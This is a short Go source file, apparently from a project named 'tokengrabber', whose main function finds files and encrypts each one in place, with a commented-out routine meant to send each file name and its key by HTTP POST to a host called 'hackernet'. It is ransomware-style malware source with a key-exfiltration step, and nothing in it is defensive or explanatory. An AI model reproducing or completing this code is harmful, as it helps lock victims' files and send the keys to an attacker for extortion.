package main

import (
	"fmt"
	"tokengrabber/encryptutils"
)

type captured_user struct {
	file string
	key  [16]byte
}

func main() {
	var files = encryptutils.Findfiles()
	for _, file := range files {
		fmt.Println(file)
		encryptutils.EncryptFile(file)
	}
}

func send(file string, key [16]byte) {
	/*
		data := captured_user{
			file: file,
			key:  key,
		}
		resp := http.Post("hackernet", "application/json", data)
	*/
}
